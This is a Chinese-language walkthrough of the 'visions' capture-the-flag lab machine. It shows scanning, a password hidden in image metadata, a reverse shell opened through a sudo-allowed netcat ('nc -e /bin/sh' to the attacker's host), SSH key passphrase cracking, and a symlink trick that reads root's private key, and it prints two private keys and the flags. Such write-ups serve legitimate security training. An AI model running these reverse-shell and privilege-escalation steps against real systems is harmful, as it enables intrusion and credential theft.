# 信息搜集
主机发现

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.21.0/24   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-13 00:50 EDT
Nmap scan report for 192.168.21.1 (192.168.21.1)
Host is up (0.0020s latency).
MAC Address: CC:E0:DA:EB:34:A2 (Baidu Online Network Technology (Beijing))
Nmap scan report for 192.168.21.2 (192.168.21.2)
Host is up (0.000090s latency).
MAC Address: 04:6C:59:BD:33:50 (Intel Corporate)
Nmap scan report for 192.168.21.3 (192.168.21.3)
Host is up (0.00023s latency).
MAC Address: 08:00:27:5C:8A:1D (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.21.4 (192.168.21.4)
Host is up (0.0060s latency).
MAC Address: C2:AB:39:9E:98:94 (Unknown)
Nmap scan report for 192.168.21.13 (192.168.21.13)
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.03 seconds
```
端口扫描

```bash
┌──(kali㉿kali)-[~]
└─$ nmap --min-rate 10000 -p- 192.168.21.3
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-13 00:51 EDT
Nmap scan report for 192.168.21.3 (192.168.21.3)
Host is up (0.000077s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:5C:8A:1D (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.07 seconds
                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -sU --min-rate 10000 -p- 192.168.21.3
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-13 00:51 EDT
Warning: 192.168.21.3 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.21.3 (192.168.21.3)
Host is up (0.00037s latency).
All 65535 scanned ports on 192.168.21.3 (192.168.21.3) are in ignored states.
Not shown: 65457 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
MAC Address: 08:00:27:5C:8A:1D (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 73.02 seconds
                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -sT -sV -O -p22,80 192.168.21.3      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-13 00:53 EDT
Nmap scan report for 192.168.21.3 (192.168.21.3)
Host is up (0.00036s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    nginx 1.14.2
MAC Address: 08:00:27:5C:8A:1D (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.64 seconds
```
# 漏洞利用
看一下80端口，得到一个用户名：alicia

![输入图片说明](image/30480b4b3e2841018b4a04e11f3be115.png)

![输入图片说明](image/e4615a4929af4c4aa4436ca77956fe07.png)

目录扫描什么也没扫出来

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.21.3 -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.21.3
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```
再找找有什么信息

```bash
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.3    
<!-- 
Only those that can see the invisible can do the imposible.
You have to be able to see what doesnt exist.
Only those that can see the invisible being able to see whats not there.
-alicia -->
 <img src="white.png"> 
```
下载下来图片看看有什么信息，得到密码：ihaveadream

```bash
┌──(kali㉿kali)-[~]
└─$ stegseek 1.jpg /usr/share/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[!] error: could not open the file "1.jpg".
                                                                
┌──(kali㉿kali)-[~]
└─$ exiftool 1.png 
ExifTool Version Number         : 13.00
File Name                       : 1.png
Directory                       : .
File Size                       : 13 kB
File Modification Date/Time     : 2025:03:13 00:59:33-04:00
File Access Date/Time           : 2025:03:13 00:59:43-04:00
File Inode Change Date/Time     : 2025:03:13 00:59:33-04:00
File Permissions                : -rw-rw-r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 1920
Image Height                    : 1080
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Background Color                : 255 255 255
Pixels Per Unit X               : 11811
Pixels Per Unit Y               : 11811
Pixel Units                     : meters
Modify Date                     : 2021:04:19 08:26:43
Comment                         : pw:ihaveadream
Image Size                      : 1920x1080
Megapixels                      : 2.1
```
ssh进入alicia用户

```bash
┌──(kali㉿kali)-[~]
└─$ ssh alicia@192.168.21.3                        
The authenticity of host '192.168.21.3 (192.168.21.3)' can't be established.
ED25519 key fingerprint is SHA256:bygz7T6Gfa+JkC+fYDCq3G3A/WbnZLNIOtkpFpo0R6E.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.21.3' (ED25519) to the list of known hosts.
alicia@192.168.21.3's password: 
Linux visions 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
alicia@visions:~$ 
```
# 提权
找到了emma用户
```bash
alicia@visions:~$ ls -la
total 20
drwxr-xr-x 2 alicia alicia 4096 Apr 19  2021 .
drwxr-xr-x 6 root   root   4096 Apr 19  2021 ..
-rw-r--r-- 1 alicia alicia  220 Apr 19  2021 .bash_logout
-rw-r--r-- 1 alicia alicia 3526 Apr 19  2021 .bashrc
-rw-r--r-- 1 alicia alicia  807 Apr 19  2021 .profile
alicia@visions:~$ sudo -l
Matching Defaults entries for alicia on visions:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User alicia may run the following commands on visions:
    (emma) NOPASSWD: /usr/bin/nc
```

![输入图片说明](image/f34ee07b6b3d40abb9109125cdea2ca9.png)

nc反弹回来了

```bash
alicia@visions:~$ sudo -u emma /usr/bin/nc -e /bin/sh 192.168.21.13 4444
```

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444         
listening on [any] 4444 ...
connect to [192.168.21.13] from (UNKNOWN) [192.168.21.3] 59256
python -c "import pty;pty.spawn('/bin/bash')"
emma@visions:/home/alicia$ 
```
看看有什么

```bash
emma@visions:/home/alicia$ cd ~
cd ~
emma@visions:~$ ls -la
ls -la
total 36
drwxr-xr-x 3 emma emma 4096 Mar 13 01:07 .
drwxr-xr-x 6 root root 4096 Apr 19  2021 ..
-rw------- 1 emma emma   19 Mar 13 01:07 .bash_history
-rw-r--r-- 1 emma emma  220 Apr 19  2021 .bash_logout
-rw-r--r-- 1 emma emma 3526 Apr 19  2021 .bashrc
drwxr-xr-x 3 emma emma 4096 Apr 19  2021 .local
-rw------- 1 emma emma   20 Apr 19  2021 note.txt
-rw-r--r-- 1 emma emma  807 Apr 19  2021 .profile
-rw------- 1 emma emma   53 Apr 19  2021 .Xauthority
emma@visions:~$ cat note.txt
cat note.txt
I cant help myself.
emma@visions:~$ cat /etc/passwd | grep /bin/bash
cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
emma:x:1000:1000:emma,,,:/home/emma:/bin/bash
alicia:x:1001:1001:,,,:/home/alicia:/bin/bash
sophia:x:1002:1002:,,,:/home/sophia:/bin/bash
isabella:x:1003:1003:,,,:/home/isabella:/bin/bash
emma@visions:~$ cd ..
cd ..
emma@visions:/home$ cd sophia
cd sophia
emma@visions:/home/sophia$ ls -la
ls -la
total 32
drwxr-xr-x 3 sophia sophia 4096 Apr 19  2021 .
drwxr-xr-x 6 root   root   4096 Apr 19  2021 ..
-rw-r--r-- 1 sophia sophia  220 Apr 19  2021 .bash_logout
-rw-r--r-- 1 sophia sophia 3526 Apr 19  2021 .bashrc
-rwx--x--x 1 sophia sophia 1920 Apr 19  2021 flag.sh
drwxr-xr-x 3 sophia sophia 4096 Apr 19  2021 .local
-rw-r--r-- 1 sophia sophia  807 Apr 19  2021 .profile
-rw------- 1 sophia sophia   18 Apr 19  2021 user.txt
emma@visions:/home/sophia$ which getcap
which getcap
/usr/sbin/getcap
emma@visions:/home/sophia$ /usr/sbin/getcap -r / 2>/dev/null
/usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
emma@visions:/home/sophia$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/bin/mount
/usr/bin/passwd
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```
被困在这里了,看了下大佬写的，才知道之前的图片，还有信息

![输入图片说明](image/b0ed67de119d490e82b5f004f6a1c2f1.png)

切换一下

```bash
emma@visions:/home/sophia$ su sophia
su sophia
Password: seemstobeimpossible

sophia@visions:~$ 
```
不可以直接cat

```bash
sophia@visions:~$ ls -la
ls -la
total 32
drwxr-xr-x 3 sophia sophia 4096 Apr 19  2021 .
drwxr-xr-x 6 root   root   4096 Apr 19  2021 ..
-rw-r--r-- 1 sophia sophia  220 Apr 19  2021 .bash_logout
-rw-r--r-- 1 sophia sophia 3526 Apr 19  2021 .bashrc
-rwx--x--x 1 sophia sophia 1920 Apr 19  2021 flag.sh
drwxr-xr-x 3 sophia sophia 4096 Apr 19  2021 .local
-rw-r--r-- 1 sophia sophia  807 Apr 19  2021 .profile
-rw------- 1 sophia sophia   18 Apr 19  2021 user.txt
sophia@visions:~$ cat user.txt  
cat er.txt
cat: er.txt: No such file or directory
```
user.txt

```bash
sophia@visions:~$ ls -la
total 36
drwxr-xr-x 3 sophia sophia 4096 Mar 13 01:22 .
drwxr-xr-x 6 root   root   4096 Apr 19  2021 ..
-rw------- 1 sophia sophia   45 Mar 13 01:22 .bash_history
-rw-r--r-- 1 sophia sophia  220 Apr 19  2021 .bash_logout
-rw-r--r-- 1 sophia sophia 3526 Apr 19  2021 .bashrc
-rwx--x--x 1 sophia sophia 1920 Apr 19  2021 flag.sh
drwxr-xr-x 3 sophia sophia 4096 Apr 19  2021 .local
-rw-r--r-- 1 sophia sophia  807 Apr 19  2021 .profile
-rw------- 1 sophia sophia   18 Apr 19  2021 user.txt
sophia@visions:~$ cat user.txt
hmvicanseeforever
```
看看哪里可以利用的
```bash
sophia@visions:~$ sudo -l
Matching Defaults entries for sophia on visions:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sophia may run the following commands on visions:
    (ALL : ALL) NOPASSWD: /usr/bin/cat /home/isabella/.invisible
```

![输入图片说明](image/0c6ed2e5b0bf4457b6009129a8fcee5a.png)

看一下/home/isabella/.invisible

```bash
sophia@visions:~$ sudo /usr/bin/cat /home/isabella/.invisible
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBMekPa3i
1sMQAToGnurcIWAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQDNAxlJldzm
IgVNFXbjg51CS4YEuIxM5gQxjafNJ/rzYw0sOPkT9sL6dYasQcOHX1SYxk5E+qD8QNZQPZ
GfACdWDLwOcI4LLME0BOjARwmrpU4mJXwugX4+RbGICFMgY8ZYtKXEIoF8dwKPVsBdoIwi
lgHyfJD4LwkqfV6mvlau+XRZZBhvlNP10F0SAAZqBaA9y7hRWJO/XcCZC6HzJKzloAL2Xw
GvAMzgtPH/wj06NoOFjmVGMfmmHzCwgc+fLOeXXYzFeRNPH3cVExc+BnB8Ju6CFa6n7VBV
HLCYJ3CcgKnxv6OwVtkoDi0UEFUOefELQV7fZ+g1sZt/+2XPsmcZAAAD0E8RIvVF4XlKJq
INtHdJ5QJZCuq2ufynbPNiHF53PqSlmC//OkQZMWgJ5DcbzMJ92IqxRgjilZZUOUbE/SFI
PViwmpRWIGAhlyoPXyV513ukhb4UngYlgCP9qC4Rbn+Tp9Fv7lnAoD0DsmwITM2e/Z65AD
/i/BqrJ6scNEN0q+qNr3zOVljMZx+qy8cbuDn9Tbq2/N+mcoEysfjfOaoJIgVJnLx1XE6r
+Y9UcRyPAYs+5TB1Nz/fpnBo7vesOu5XLUqCBCphFGmdMCdSGYZAweitjQ+Mq36hQmCtSs
Dwcbjg8vy5LJ+mtJXA7QhqgAfXWnLLny4NeCztUnTG0NLjbLR6M5e+HSsi2EqDYoGNpWld
l4YzVPQoFMIaUJOGTc+VfkMWbQhzpiu66/Du8dwhC+p6QSmwhV/M70eWaH2ZVjK3MThg9K
CVugFsLxioqlp/rnE1oq7apTBX6FOjwz0ne+ytTVOQrHuPTs2QL4PlCvhPRoIuqydleFs4
rdtzE6b46PexXlupewywiO5AVzbfSRAlCYwiwV42xGpYsNcKhdUY+Q9d9i9yudjIFoicrA
MG9hxr7/DJqEY311kTglDEHqQB3faErYsYPiOL9TTZWnPLZhClrPbiWST5tmMWxgNE/AKY
R7mKGDBOMFPlBAjGuKqR6zk5DEc3RzJnvGjUlaT3zzdVmxD8SpWtjzS6xHaSw/WOvB0lsg
Dhf+Gc7OWyHm2qk+OMK9t0/lbIDfn3su0EHwbPjYTT3xk7CtG4AwiSqPve1t9bOdzD9w9r
TM7am/2i/BV1uv28823pCuYZmNG7hu5InzNC/3iTROraE31Qqe3JCNwxVDcHqb8s6gTN+J
q6OyZdvNNiVQUo1l7hNUlg4he4q1kTwoyAATa0hPKVxEFEISRtaQln5Ni8V+fos8GTqgAr
HH2LpFa4qZKTtUEU0f54ixjFL7Lkz6owbUG7Cy+LuGDI1aKJRGCZwd5LkStcF/MAO3pulc
MsHiYwmXT3lNHhkAd1h05N2yBzXaH+M3sX6IpNtq+gi+9F443Enk7FBRFLzxdJ+UT40f6E
+gyA2nBGygNhvQHXcu36A8BoE+IF7YVpdfDmYJffbTujtBUj2vrdsqVvtGUxf0vj9/Sv+J
HN9Yk2giXN8VX7qhcyLzUktmdfgd6JNAx+/P7Kh3HV5oWk1Da+VJS+wtCg/oEVSVyrEOpe
skV8zcwd+ErNODEHTUbD/nDARX8GeV158RMtRdZ5CJZSFjBz2oPDPDVpZMFNhENAAwPnrJ
KD/C2J6CKylbopifizfpEkmVqJRms=
-----END OPENSSH PRIVATE KEY-----
```
保存下来登录isabella，需要密码

```bash
┌──(kali㉿kali)-[~]
└─$ ssh isabella@192.168.21.3 -i id_rsa
Enter passphrase for key 'id_rsa': 
isabella@192.168.21.3's password:
```
爆破一下

```bash
┌──(kali㉿kali)-[~]
└─$ john --wordlist=/path/to/your/wordlist.txt id_rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
fopen: /path/to/your/wordlist.txt: No such file or directory
┌──(kali㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
invisible        (id_rsa)     
1g 0:00:04:43 DONE (2025-03-13 01:40) 0.003533g/s 39.91p/s 39.91c/s 39.91C/s merda..damnyou
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
ssh连接成功

```bash
┌──(kali㉿kali)-[~]
└─$ ssh isabella@192.168.21.3 -i id_rsa          
Enter passphrase for key 'id_rsa': 
Linux visions 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
isabella@visions:~$ 
```
提权

```bash
isabella@visions:~$ sudo -l
Matching Defaults entries for isabella on visions:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User isabella may run the following commands on visions:
    (emma) NOPASSWD: /usr/bin/man
isabella@visions:~$ ls -la
total 28
drwxr-xr-x 3 isabella isabella 4096 Apr 19  2021 .
drwxr-xr-x 6 root     root     4096 Apr 19  2021 ..
-rw-r--r-- 1 isabella isabella  220 Apr 19  2021 .bash_logout
-rw-r--r-- 1 isabella isabella 3526 Apr 19  2021 .bashrc
-rw------- 1 isabella isabella 1876 Apr 19  2021 .invisible
-rw-r--r-- 1 isabella isabella  807 Apr 19  2021 .profile
drwx------ 2 isabella isabella 4096 Apr 19  2021 .ssh
isabella@visions:~$ rm -rf ./.invisible
isabella@visions:~$ ln -s /root/.ssh/id_rsa ./.invisible
isabella@visions:~$ su sophia
Password: 
sophia@visions:/home/isabella$ sudo -l
Matching Defaults entries for sophia on visions:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sophia may run the following commands on visions:
    (ALL : ALL) NOPASSWD: /usr/bin/cat /home/isabella/.invisible
sophia@visions:/home/isabella$ sudo -u root /usr/bin/cat /home/isabella/.invisible
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAyezVs6KCQ/KFWpEkzDWX3ns/X4lUnh6PnNC2IVg3ciVgLcWF//wb
vlQxI+juYu5qTKVEL1FhkNaas+MlQUxabzOv+SDnCck60BLQbZf46sYHQaTrDyu5zhIWWi
wgPjmic/Ykd2qIQyIpyy9Ru4DiVK4RWLZWM28kb6eB99JTt4GSVEhraJ08hKsgaOi+skNg
S4QG85kG4ghmA1yJpPwzzpIdG4HUic63OXgy+z+pVB5oIEp0YXrCKMN/lBngZjZb9/+0S1
ljKzdcq7m1TOQ1Y04YJNMrxvPJ75d8U5s+m6cRxx5F3dX7oTVmErEAxFmJjdWVChzh81Ca
OnicNjHgrQAAA8hmM8ISZjPCEgAAAAdzc2gtcnNhAAABAQDJ7NWzooJD8oVakSTMNZfeez
9fiVSeHo+c0LYhWDdyJWAtxYX//Bu+VDEj6O5i7mpMpUQvUWGQ1pqz4yVBTFpvM6/5IOcJ
yTrQEtBtl/jqxgdBpOsPK7nOEhZaLCA+OaJz9iR3aohDIinLL1G7gOJUrhFYtlYzbyRvp4
H30lO3gZJUSGtonTyEqyBo6L6yQ2BLhAbzmQbiCGYDXImk/DPOkh0bgdSJzrc5eDL7P6lU
HmggSnRhesIow3+UGeBmNlv3/7RLWWMrN1yrubVM5DVjThgk0yvG88nvl3xTmz6bpxHHHk
Xd1fuhNWYSsQDEWYmN1ZUKHOHzUJo6eJw2MeCtAAAAAwEAAQAAAQEAiCmVXYHLN8h1VkIj
vzSwiU0wydqQXeOb0hIHjuqu0OEVPyhAGQNHLgwV6vIqtjmxIqgbF5FYKlQclAsq1yKGpR
AErQkb4sR4TVEyjYR6TM5mnER6YYuJysT1n667u1ogCvRDWOdUpXiHGEV7ZuYdOR78AYdL
D3n15vjcsmF5JHcftHOxnXraX7JqGXNCoRsMLT/yUOl02ClHsjFql1NTI/Br0GA4xhM/16
RHoRu1itOlWoyF4XSpSUDHW0RVQ/0gm/GyAc9QF6EWZXHfMfW07JvkeQLlndVbnItQ9a3v
ICAAh6zOZWVXpbhCPjjfaWTnwHhhSE3vfxMQQNTJnEghnQAAAIEAjAEzb6Xp6VV1RRaJR3
/Gxo0BRIbPJXdRXpDI3NO4Nvtzv8fX3muV/i+dgYPNqa7cwheSJZX9S7RzXsZTZn1Ywbdw
ahYTVyE9B4Nsen5gekylb59tNwPpCR8sJo6ZIL1GpmkEug+r+0YZyqpZXpG5uhCaSLX1fP
3UnkgqiKuzpvQAAACBAOOlQPW6pWXvULDsiUkilMXY0SNYLupMHJuqnWTuufyNfRthPQF2
gfWwXRjfDmzFoM9vVxJKKSd40696qbmTNnu7I4KyvXkF0OQ3IXIelQIiIcDpDbYd17g47J
IC6dHIQmUib3+whjeTvA5cc21y0EGNHoeNrlknE03dZHaIyfdPAAAAgQDjE3TE17PMEnd/
vzau9bBYZaoRt+eYmvXFrkU/UdRwqjS/LPWxwmpLOASW9x3bH/aiqNGBKeSe2k4C7MWWD5
tllkIbNEJNDtqQNt2NRvhDUOzAxca1C/IySuwoCAvoym5cpZ//EQ/OvWyZRwk3enReVmmd
x7Itf3P39SxqlP2pQwAAAAxyb290QHZpc2lvbnMBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```
保存下来，利用他登录root，root.txt

```bash
┌──(kali㉿kali)-[~]
└─$ ssh root@192.168.21.3 -i id_rsa 
Linux visions 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Apr 19 05:24:08 2021
root@visions:~# ls -la
total 32
drwx------  4 root root 4096 Apr 19  2021 .
drwxr-xr-x 18 root root 4096 Apr 19  2021 ..
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rwx--x--x  1 root root 1920 Apr 19  2021 flag.sh
drwxr-xr-x  3 root root 4096 Apr 19  2021 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root   15 Apr 19  2021 root.txt
drwx------  2 root root 4096 Apr 19  2021 .ssh
root@visions:~# cat root.txt
hmvitspossible
```